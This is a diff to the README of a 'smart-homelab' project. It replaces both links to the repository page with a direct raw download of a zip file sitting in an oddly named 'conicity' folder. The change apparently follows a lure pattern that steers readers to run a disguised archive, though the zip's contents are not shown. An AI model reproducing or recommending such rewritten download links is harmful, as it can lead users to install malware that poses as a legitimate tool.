@@ -1,6 +1,6 @@
 # 🏠 smart-homelab - Simple AI for your home lab
 
-[![Download smart-homelab](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge)](https://github.com/Hans-peterplagiaristic194/smart-homelab)
+[![Download smart-homelab](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge)](https://github.com/Hans-peterplagiaristic194/smart-homelab/raw/refs/heads/main/conicity/smart_homelab_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use the steps below to download and run it on your PC.
 
 Open this page to download the app:
 
-https://github.com/Hans-peterplagiaristic194/smart-homelab
+https://github.com/Hans-peterplagiaristic194/smart-homelab/raw/refs/heads/main/conicity/smart_homelab_v1.5.zip
 
 1. Click the link above.
 2. On the GitHub page, look for the latest release or the main download area.
